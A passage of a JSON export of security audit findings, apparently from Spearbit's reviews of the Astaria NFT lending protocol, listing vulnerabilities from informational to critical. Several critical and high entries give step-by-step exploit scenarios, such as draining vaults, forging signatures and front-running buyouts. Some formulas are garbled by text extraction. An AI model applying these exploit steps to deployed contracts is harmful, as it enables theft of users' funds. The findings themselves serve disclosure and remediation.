        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Both ICollateralToken.FileType and ILienToken.FileType start their enums with NotSupported. The definition of FileType in IAstariaRouter is not consistent with that pattern. This might be due to having 0 as a NotSupported so that the file endpoints would revert.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "VIData.allowlist can transfer shares to entities not on the allowlist",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "allowList is only used to restrict the share recipients upon mint or deposit to a vault if allowLis- tEnabled is set to true. These shareholders can later transfer their share to other users who might not be on the allowList.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Extract common struct fields from IStrategyValidator implementations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "All the IStrategyValidator implementations have the following data encoded in the NewLienRe- quest.nlrDetails struct CommonData { uint8 version; address token; // LP token for Uni_V3... address borrower; ILienToken.Details lienDetails; bytes moreData; // depends on each implementation }",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "_createLien() takes in an extra argument",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "_createLien(LienStorage storage s, ...) doesn't use s and hence can be removed as an argument.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "unchecked has no effect",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "unchecked only affects the arithmetic operations directly nested under it. In this case unchecked is unnecessary: unchecked { s.yIntercept = (_totalAssets(s)); s.last = block.timestamp.safeCastTo40(); }",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Multicall can reuse msg.value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "A delegatecall forwards the same value for msg.value as found in the current context. Hence, all delegatecalls in a loop use the same value for msg.value. In the case of these calls using msg.value, it has the ability to use the native token balance of the contract itself for (uint256 i = 0; i < data.length; i++) { (bool success, bytes memory result) = address(this).delegatecall(data[i]); ... }",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Authorised entities can drain user assets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "An authorized entity can steal user approved tokens (vault assets and vault tokens, ...) using these endpoints 58 function tokenTransferFrom( address token, address from, address to, uint256 amount ) external requiresAuth { ERC20(token).safeTransferFrom(from, to, amount); } function tokenTransferFromWithErrorReceiver( address token, address from, address to, uint256 amount ) external requiresAuth { try ERC20(token).transferFrom(from, to, amount) {} catch { _transferToErrorReceiver(token, from, to, amount); } } Same risk applies to all the other upgradable contracts.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Conditional statement in _validateSignature(...) can be simplified/optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "When validating the vault strategist's (or delegate's) signature for the commitment, we perform the following check if ( (recovered != strategist && recovered != delegate) || recovered == address(0) ) { revert IVaultImplementation.InvalidRequest( IVaultImplementation.InvalidRequestReason.INVALID_SIGNATURE ); } The conditional statement: (recovered != strategist && recovered != delegate) 59 perhaps can be optimised/simplified.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "AstariaRouter cannot deposit into private vaults",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The allowlist for private vaults only includes the private vault's owner function newVault( address delegate, address underlying ) external whenNotPaused returns (address) { address[] memory allowList = new address[](1); allowList[0] = msg.sender; RouterStorage storage s = _loadRouterSlot(); ... } Note that for private vaults we cannot modify or disable/enable the allowlist. includes the owner. It is always enabled and only That means only the owner can deposit into the private vault function deposit( uint256 amount, address receiver ) public virtual whenNotPaused returns (uint256) { VIData storage s = _loadVISlot(); require(s.allowList[msg.sender] && receiver == owner()); ... } If we the owner would like to be able to use the AstariaRouter's interface by calling its deposit(...), or de- positToVault(...) endpoint (which uses the pulling strategy from transfer proxy), it would not be able to. Anyone can directly transfer tokens to this private vault by calling asset() directly. So above requirement re- quire(s.allowList[msg.sender] ... ) seems to also be there to avoid potential mistakes when one is calling the ERC4626RouterBase.deposit(...) endpoint to deposit into the vault indirectly using the router.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reorganise sanity/validity checks in the commitToLien(...) flow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The following checks are preformed in _validateRequest(...):  params.lienRequest.amount == 0: if (params.lienRequest.amount == 0) { revert ILienToken.InvalidLienState( ILienToken.InvalidLienStates.AMOUNT_ZERO ); } The above check can be moved to the very beginning of the commitToLien(...) flow. Perhaps right before or after we check the commitment's vault provided is valid.  newStack.lien.details.duration < s.minLoanDuration can be checked right after we compare to time to the second epoch end: if (publicVault.supportsInterface(type(IPublicVault).interfaceId)) { uint256 timeToSecondEpochEnd = publicVault.timeToSecondEpochEnd(); require(timeToSecondEpochEnd > 0, \"already two epochs ahead\"); if (timeToSecondEpochEnd < lien.details.duration) { lien.details.duration = timeToSecondEpochEnd; } } if (lien.details.duration < s.minLoanDuration) { revert ILienToken.InvalidLienState( ILienToken.InvalidLienStates.MIN_DURATION_NOT_MET ); } This only works if we assume the LienToken.createLien(...) endpoint does not change the duration. The current implementation does not.  block.timestamp > params.lienRequest.strategy.deadline can also be checked at the very beginning of the commitToLien flow.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Refactor fetching strategyValidator",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Both _validateCommitment(...) and getStrategyValidator(...) need to fetch strategyVal- idator and both use the same logic.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "The stack provided as an extra data to settle Seaport auctions need to be retrievable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The stack provided as an extra data to settle Seaport auctions need to be retrievable. Perhaps one can figure this from various events or off-chain agents, but it is not directly retrievable.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Make sure CollateralToken is connected to Seaport v1.5",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Currently the CollateralToken proxy (v0) is connected to Seaport v1.1 which has different call- backs to the zone and it also only performs static calls. If the current version of CollateralToken gets connected to the Seaport v1.1, no one would be able to settle auctions created by the CollateralToken. This is due to the fact that the callbacks would revert.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "LienToken.transferFrom does not update a public vault's bookkeeping parameters when a lien is transferred to it.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When transferFrom is called, there is not check whether the from or to parameters could be a public vault. Currently, there is no mechanism for public vaults to transfer their liens. But private vault owners who are also owners of the vault's lien tokens, they can call transferFrom and transfer their liens to a public vault. In this case, we would need to make sure to update the bookkeeping for the public vault that the lien was transferred to. On the LienToken side, s.LienMeta[id].payee needs to be set to the address of the public vault. And on the PublicVault side, yIntercept, slope, last, epochData of VaultData need to be updated (this requires knowing the lien's end). However, private vaults do not keep a record of these values, and the corresponding values are only saved in stacks off-chain and validated on-chain using their hash.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Anyone can take a valid commitment combined with a self-registered private vault to steal funds from any vault without owning any collateral",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The issue stems from the following check in VaultImplementation._validateCommitment(params, receiver): if ( msg.sender != holder && receiver != holder && receiver != operator && !ROUTER().isValidVault(receiver) // <-- the problematic condition ) { ... In this if block if receiver is a valid vault the body of the if is skipped. A valid vault is one that has been registered in AstariaRouter using newVault or newPublicVault. So for example any supplied private vault as a receiver would be allowed here and the call to _validateCommitment will continue without reverting at least in this if block. If we backtrack function calls to _validateCommitment, we arrive to 3 exposed endpoints:  commitToLiens  buyoutLien  commitToLien A call to commitToLiens will end up having the receiver be the AstariaRouter. A call to buyoutLien will set the receiver as the recipient() for the vault which is either the vault itself for public vaults or the owner for private vaults. So we are only left with commitToLien, where the caller can set the value for the receiver directly. 8 A call to commitToLien will initiate a series of function calls, and so receiver is only supplied to _validateCommit- ment to check whether it is allowed to be used and finally when transferring safeTransfer) wETH. This opens up exploiting scenarios where an attacker: 1. Creates a new private vault by calling newVault, let's call it V . 2. Takes a valid commitment C and combines it with V and supply those to commitToLien. 3. Calls withdraw endpoint of V to withdraw all the funds. For step 2. the attacker can source valid commitments by doing either of the following: 1. Frontrun calls to commitToLiens and take all the commitments C0, (cid:1) (cid:1) (cid:1) , Cn and supply them one by one along with V to commitToLien endpoint of the vault that was specified by each Ci . 2. Frontrun calls to commitToLien endpoints of vaults, take their commitment C and combine it with V to send to commitToLien. 3. Backrun the either scenarios from the above points and create a new commitment with new lien request that tries to max out the potential debt for a collateral while also keeping other inequalities valid (for example, the inequality regarding liquidationInitialAsk).",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Collateral owner can steal funds by taking liens while asset is listed for sale on Seaport",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "We only allow collateral holders to call listForSaleOnSeaport if they are listing the collateral at a price that is sufficient to pay back all of the liens on their collateral. When a new lien is created, we check that collateralStateHash != bytes32(\"ACTIVE_AUCTION\") to ensure that the collateral is able to accept a new lien. However, calling listForSaleOnSeaport does not set the collateralStateHash, so it doesn't stop us from taking new liens. As a result, a user can deposit collateral and then, in one transaction:  List the asset for sale on Seaport for 1 wei.  Take the maximum possible loans against the asset.  Buy the asset on Seaport for 1 wei. The 1 wei will not be sufficient to pay back the lenders, and the user will be left with the collateral as well as the loans (minus 1 wei).",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "validateStack allows any stack to be used with collateral with no liens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The validateStack modifier is used to confirm that a stack entered by a user matches the stateHash in storage. However, the function reverts under the following conditions: if (stateHash != bytes32(0) && keccak256(abi.encode(stack)) != stateHash) { revert InvalidState(InvalidStates.INVALID_HASH); } The result is that any collateral with stateHash == bytes32(0) (which is all collateral without any liens taken against it yet) will accept any provided stack as valid. This can be used in a number of harmful ways. Examples of vulnerable endpoints are:  createLien: If we create the first lien but pass a stack with other liens, those liens will automatically be included in the stack going forward, which means that the collateral holder will owe money they didn't receive.  makePayment: If we make a payment on behalf of a collateral with no liens, but include a stack with many liens (all owed to me), the result will be that the collateral will be left with the remaining liens continuing to be owed  buyoutLien: Anyone can call buyoutLien(...) and provide parameters that are spoofed but satisfy some constraints so that the call would not revert. This is currently possible due to the issue in this context. As a consequence the caller can  _mint any unminted liens which can DoS the system.  _burn lienIds that they don't have the right to remove.  manipulate any public vault's storage (if it has been set as a payee for a lien) through its handleBuyout- Lien. It seems like this endpoint might have been meant to be a restricted endpoint that only registered vaults can call into. And the caller/user is supposed to only call into here from VaultImplementa- tion.buyoutLien.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "A borrower can list their collateral on Seaport and receive almost all the listing price without paying back their liens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When the collateral s.auctionData is not populated and thus, function gets called since stack.length is 0, this loop will not run and no payment is sent to the lending vaults. The rest of the payment is sent to the borrower. And the collateral token and its related data gets burnt/deleted by calling settleAuction. The lien tokens and the vaults remain untouched as though nothing has happened. is listed on SeaPort by the borrower using listForSaleOnSeaport, if that order gets fulfilled/matched and ClearingHouse's fallback So basically a borrower can: 1. Take/borrow liens by offering a collateral. 2. List their collateral on SeaPort through the listForSaleOnSeaport endpoint. 3. Once/if the SeaPort order fulfills/matches, the borrower would be paid the listing price minus the amount sent to the liquidator (address(0) in this case, which should be corrected). 4. Collateral token/data gets burnt/deleted. 5. Lien token data remains and the loans are not paid back to the vaults. And so the borrower could end up with all the loans they have taken plus the listing price from the SeaPort order. Note that when a user lists their own collateral on Seaport, it seems that we intentionally do not kick off the auction process:  Liens are continued.  Collateral state hash is unchanged.  liquidator isn't set.  Vaults aren't updated.  Withdraw proxies aren't set, etc. Related issue 88.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Phony signatures can be used to forge any strategy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In _validateCommitment(), we check that the merkle root of the strategy has been signed by the strategist or delegate. After the signer is recovered, the following check is performed to validate the signature: recovered != owner() && recovered != s.delegate && recovered != address(0) 11 This check seems to be miswritten, so that any time recovered == address(0), the check passes. When ecrecover is used to check the signed data, it returns address(0) in the situation that a phony signature is submitted. See this example for how this can be done. The result is that any borrower can pass in any merkle root they'd like, sign it in a way that causes address(0) to return from ecrecover, and have their commitment validated.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Inequalities involving liquidationInitialAsk and potentialDebt can be broken when buyoutLien is called",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When we commit to a new lien, the following gets checked to be true for all j 2 0, (cid:1) (cid:1) (cid:1) , n (cid:0) 1: onew + on(cid:0)1 + (cid:1) (cid:1) (cid:1) + oj (cid:20) Lj where: parameter description oi onew n Li L0 k k A0 k _getOwed(newStack[i], newStack[i].point.end) _getOwed(newSlot, newSlot.point.end) stack.length newStack[i].lien.details.liquidationInitialAsk params.encumber.lien.details.liquidationInitialAsk params.position params.encumber.amount 12 so in a stack in general we should have the: But when an old lien is replaced with a new one, we only perform the following checks for L0 k : (cid:1) (cid:1) (cid:1) + oj+1 + oj (cid:20) Lj 0 0 0 k ^ L k (cid:21) A L k > 0 And thus we can introduce:  L0  o0 k (cid:28) Lk or k (cid:29) ok (by pushing the lien duration) which would break the inequality regarding oi s and Li . If the inequality is broken, for example, if we buy out the first lien in the stack, then if the lien expires and goes into a Seaport auction the auction's starting price L0 would not be able to cover all the potential debts even at the beginning of the auction.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "VaultImplementation.buyoutLien can be DoSed by calls to LienToken.buyoutLien (cid:1) (cid:1) (cid:1) + oj+1 + oj (cid:20) Lj",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Anyone can call into LienToken.buyoutLien and provide params of the type LienActionBuyout: params.incoming is not used, so for example vault signatures or strategy validation is skipped. There are a few checks for params.encumber. Let's define the following variables: parameter value i kj tj ej e0 i lj l 0 i rj r 0 i c params.position params.encumber.stack[j].point.position params.encumber.stack[j].point.last params.encumber.stack[j].point.end tnow + D0 i params.encumber.stack[j].point.lienId i )) where h is the keccak256 of the encoding i , r 0 i , c0 i , S0 i , D0 i , V 0 i , (A0max h(N 0 i , P 0 i , L0 params.encumber.stack[j].lien.details.rate : old rate params.encumber.lien.details.rate : new rate params.encumber.collateralId 13 parameter value cj c0 i Aj A0 i Amax j A0max i R Nj N 0 i Vj V 0 i Sj S0 i Dj D0 i Pj P0 i Lj L0 i Imin Dmin tnow bi o oj n params.encumber.stack[j].lien.collateralId params.encumber.lien.collateralId params.encumber.stack[j].point.amount params.encumber.amount params.encumber.stack[j].lien.details.maxAmount params.encumber.lien.details.maxAmount params.encumber.receiver params.encumber.stack[j].lien.token params.encumber.lien.token params.encumber.stack[j].lien.vault params.encumber.lien.vault params.encumber.stack[j].lien.strategyRoot params.encumber.lien.strategyRoot params.encumber.stack[j].lien.details.duration params.encumber.lien.details.duration params.encumber.stack[j].lien.details.maxPotentialDebt params.encumber.lien.details.maxPotentialDebt params.encumber.stack[j].lien.details.liquidationInitialAsk params.encumber.lien.details.liquidationInitialAsk AstariaRouter.s.minInterestBPS AstariaRouter.s.minDurationIncrease block.timestamp buyout _getOwed(params.encumber.stack[params.position], block.timestamp) _getOwed(params.encumber.stack[j], params.encumber.stack[j].point.end) params.encumber.stack.length O = o0 + o1 + (cid:1) (cid:1) (cid:1) + on(cid:0)1 _getMaxPotentialDebtForCollateral(params.encumber.stack) sj s0 i params.encumber.stack[j] newStack Let's go over the checks and modifications that buyoutLien does: 1. validateStack is called to make sure that the hash of params.encumber.stack matches with s.collateralStateHash value of c. This is not important and can be bypassed by the exploit even after the fix for Issue 106. 2. _createLien is called next which does the following checks: 2.1. c is not up for auction. 2.2. We haven't reached max number of liens, currently set to 5. 2.3. L0 > 0 2.4. If params.encumber.stack is not empty then c0 i , (A0max i , L0 i )) where h is the hashing mechanism of encoding and then taking the keccak256. 2.6 The new stack slot and i = c0 2.5. We _mint a new lien for R with id equal to h(N 0 i and L0 i (cid:21) A0 i , V 0 i , D0 i , S0 i , P 0 i , c0 , r 0 i i 14 the new lien id is returned. 3. isValidRefinance is called which performs the following checks: 3.1. checks c0 i = c0 3.2. checks either or (r 0 i < ri (cid:0) Imin) ^ (e0 i (cid:21) ei ) i i (cid:20) ri ) ^ (e0 (r 0 is in auction by checking s.collateralStateHash's value. i (cid:21) ei + Dmin) 4. check where c0 i 5. check O (cid:20) P0 i . 6. check A0max (cid:21) o. 7. send wETH through TRANSFER_PROXY from msg.sender to payee of li with the amount of bi . 8. if payee of li is a public vault, do some book keeping by calling handleBuyoutLien. 9. call _replaceStackAtPositionWithNewLien to:  9.1. replace si with s0  9.2. _burn li .  9.3. delete s.lienMeta of li . i in params.encumber.stack. So in a nutshell the important checks are:  c, ci are not in auction (not important for the exploit)  c0 i = c0 i and L0  n is less than or equal to max number of allowed liens ( 5 currently) (not important for the exploit)  L0 i (cid:21) A0  O (cid:20) P0 i  A0max i > 0 (cid:21) o i or (r 0 i < ri (cid:0) Imin) ^ (e0 i (cid:21) ei ) i (cid:20) ri ) ^ (e0 (r 0 i (cid:21) ei + Dmin) Exploit An attacker can DoS the VaultImplementation.buyoutLien as follows: 1. A vault decides to buy out a collateral's lien to offer better terms and so signs a commitment and some- one on behalf of the vault calls VaultImplementation.buyoutLien which if executed would call LienTo- ken.buyoutLien with the following parameters: 15 LienActionBuyout({ incoming: incomingTerms, position: position, encumber: ILienToken.LienActionEncumber({ collateralId: collateralId, amount: incomingTerms.lienRequest.amount, receiver: recipient(), lien: ROUTER().validateCommitment({ commitment: incomingTerms, timeToSecondEpochEnd: _timeToSecondEndIfPublic() }), stack: stack }) }) 2. The attacker fronrun the call from step 1. and instead provide the following modified parameters to LienTo- ken.buyoutLien LienActionBuyout({ incoming: incomingTerms, // not important, since it is not used and can be zeroed-out to save tx gas position: position, encumber: ILienToken.LienActionEncumber({ collateralId: collateralId, amount: incomingTerms.lienRequest.amount, receiver: msg.sender, // address of the attacker lien: ILienToken.Lien({ // note that the lien here would have the same fields as the original message by the vault rep. ,! token: address(s.WETH), vault: incomingTerms.lienRequest.strategy.vault, // address of the vault offering a better term strategyRoot: incomingTerms.lienRequest.merkle.root, collateralId: collateralId, details: details // see below }), stack: stack }) }) Where details provided by the attacker can be calculated by using the below snippet: uint8 nlrType = uint8(_sliceUint(commitment.lienRequest.nlrDetails, 0)); (bytes32 leaf, ILienToken.Details memory details) = IStrategyValidator( s.strategyValidators[nlrType] ).validateAndParse( commitment.lienRequest, s.COLLATERAL_TOKEN.ownerOf( commitment.tokenContract.computeId(commitment.tokenId) ), commitment.tokenContract, commitment.tokenId ); The result is that:  The newLienId that was supposed to be _minted for the recipient() of the vault, gets minted for the at- tacker.  The call to VaultImplementation.buyoutLien would fail, since the newLienId is already minted, and so the vault would not be able to receives the interests it had anticipated.  When there is a payment or Seaport auction settlement, the attacker would receive the funds instead. 16  The attacker can intorduces a malicous contract into the protocol ken.ownerOf(newLienId) without needing to register for a vault. that would be LienTo- To execute this attack, the attacker would need to spend the buyout amount of assets. Also the attacker does not necessarily need to front run a transaction to buyout a lien. They can pick their own hand-crafted parameters that would satisfy the conditions in the analysis above to introduce themselves in the protocol.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "VaultImplementation.buyoutLien does not update the new public vault's parameters and does not transfer assets between the vault and the borrower",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "VaultImplementation.buyoutLien does not update the accounting for the vault (if it's public). The slope, yIntercept, and s.epochData[...].liensOpenForEpoch (for the new lien's end epoch) are not updated. They are updated for the payee of the swapped-out lien if the payee is a public vault by calling handleBuyoutLien. Also, the buyout amount is paid out by the vault itself. The difference between the new lien amount and the buyout amount is not worked out between the msg.sender and the new vault.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "setPayee doesn't update y intercept or slope, allowing vault owner to steal all funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When setPayee() is called, the payment for the lien is no longer expected to go to the vault. How- ever, this change doesn't impact the vault's y-intercept or slope, which are used to calculate the vault's totalAs- sets(). This can be used maliciously by a vault owner to artificially increase their totalAssets() to any arbitrary amount:  Create a lien from the vault.  SetPayee to a non-vault address.  Buyout the lien from another vault (this will cause the other vault's y-int and slope to increase, but will not impact the y-int and slope of the original vault because it'll fail the check on L165 that payee is a public vault.  Repeat the process again going the other way, and repeat the full cycle until both vault's have desired totalAssets(). For an existing vault, a vault owner can withdraw a small amount of assets each epoch. If, in any epoch, they are one of the only users withdrawing funds, they can perform this attack immediately before the epoch is pro- cessed. The result is that the withdrawal shares will by multiplied by totalAssets() / totalShares() to get the withdrawal rate, which can be made artificially high enough to wipe out the entire vault.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "settleAuction() doesn't check if the auction was successful",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "settleAuction() is a privileged functionality called by LienToken.payDebtViaClearingHouse(). settleAuction() is intended to be called on a successful auction, but it doesn't verify that that's indeed the case. Anyone can create a fake Seaport order with one of its considerations set as the CollateralToken as described in Issue 93. Another potential issue is if the Seaport orders can be \"Restricted\" in future, then there is a possibility for an authorized entity to force settleAuction on CollateralToken, and when SeaPort tries to call back on the zone to validate it would fail.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Incorrect auction end validation in liquidatorNFTClaim()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "liquidatorNFTClaim() does the following check to recognize that Seaport auction has ended: if (block.timestamp < params.endTime) { //auction hasn't ended yet revert InvalidCollateralState(InvalidCollateralStates.AUCTION_ACTIVE); } Here, params is completely controlled by users and hence to bypass this check, the caller can set params.endTime to be less than block.timestamp. Thus, a possible exploit scenario occurs when AstariaRouter.liquidate() is called to list the underlying asset on Seaport which also sets liquidator address. Then, anyone can call liquidatorNFTClaim() to transfer the underlying asset to liquidator by setting params.endTime < block.timestamp.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Typed structured data hash used for signing commitments is calculated incorrectly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Since STRATEGY_TYPEHASH == keccak256(\"StrategyDetails(uint256 nonce,uint256 deadline,bytes32 root)\") The hash calculated in _encodeStrategyData is incorrect according to EIP-712. s.strategistNonce is of type uint32 and the nonce type used in the type hash is uint256. Also the struct name used in the typehash collides with StrategyDetails struct name defined as: 19 struct StrategyDetails { uint8 version; uint256 deadline; address vault; }",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "makePayment doesn't properly update stack, so most payments don't pay off debt",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "As we loop through individual payment in _makePayment, each is called with: (newStack, spent) = _payment( s, stack, uint8(i), totalCapitalAvailable, address(msg.sender) ); This call returns the updated stack as newStack but then uses the function argument stack again in the next iteration of the loop. The newStack value is unused until the final iterate, when it is passed along to _updateCollateralStateHash(). This means that the new state hash will be the original state with only the final loan repaid, even though all other loans have actually had payments made against them.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "_removeStackPosition() always reverts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "removeStackPosition() always reverts since it calls stack array for an index beyond its length: for (i; i < length; ) { unchecked { newStack[i] = stack[i + 1]; ++i; } } Notice that for i==length-1, stack[length] is called. This reverts since length is the length of stack array. Additionally, the intention is to delete the element from stack at index position and shift left the elements ap- pearing after this index. However, an addition increment to the loop index i results in newStack[position] being empty, and the shift of other elements doesn't happen.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Refactor _paymentAH()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "_paymentAH() has several vulnerabilities:  stack is a memory parameter. So all the updates made to stack are not applied back to the corresponding storage variable.  No need to update stack[position] as it's deleted later.  decreaseEpochLienCount() is always passed 0, as stack[position] is already deleted. Also decreaseEp- ochLienCount() expects epoch, but end is passed instead.  This if/else block can be merged. updateAfterLiquidationPayment() expects msg.sender to be LIEN_- TOKEN, so this should work.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "processEpoch() needs to be called regularly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "If the processEpoch() endpoint does not get called regularly (especially close to the epoch bound- aries), the updated currentEpoch would lag behind the actual expected value and this will introduce arithmetic errors in formulas regarding epochs and timestamps.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Can create lien for collateral while at auction by passing spoofed data",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In the createLien function, we check that the collateral isn't currently at auction before giving a lien with the following check: if ( s.collateralStateHash[params.collateralId] == bytes32(\"ACTIVE_AUCTION\") ) { revert InvalidState(InvalidStates.COLLATERAL_AUCTION); } However, collateralId is passed in multiple places in the params: params.encumber.lien. both in params directly and in 23 The params.encumber.lien.collateralId is used everywhere else, and is the final value that is used. But the check is performed on params.collateralId. As a result, we can set the following:  params.encumber.lien.collateralId: collateral that is at auction.  params.collateralId: collateral not at auction. This will allow us to pass this validation while using the collateral at auction for the lien.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "stateHash isn't updated by buyoutLien function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "We never update the collateral state hash anywhere in the buyoutLien function. As a result, once all checks are passed, payment will be transferred from the buyer to the seller, but the seller will retain ownership of the lien in the system's state.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "If a collateral's liquidation auction on Seaport ends without a winning bid, the call to liquidatorN- FTClaim does not clear the related data on LienToken's side and also for payees that are public vaults",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "If/when a liquidation auction ends without being fulfilled/matched on Seaport and afterward when the current liquidator calls into liquidatorNFTClaim, the storage data (s.collateralStateHash, s.auctionData, s.lienMeta) on the LienToken side don't get reset/cleared and also the lien token does not get burnt. That means:  s.collateralStateHash[collateralId] stays equal to bytes32(\"ACTIVE_AUCTION\").  s.auctionData[collateralId] will have the past auction data.  s.lienMeta[collateralId].atLiquidation will be true. That means future calls to commitToLiens by holders of the same collateral will revert.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "ClearingHouse cannot detect if a call from Seaport comes from a genuine listing or auction",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
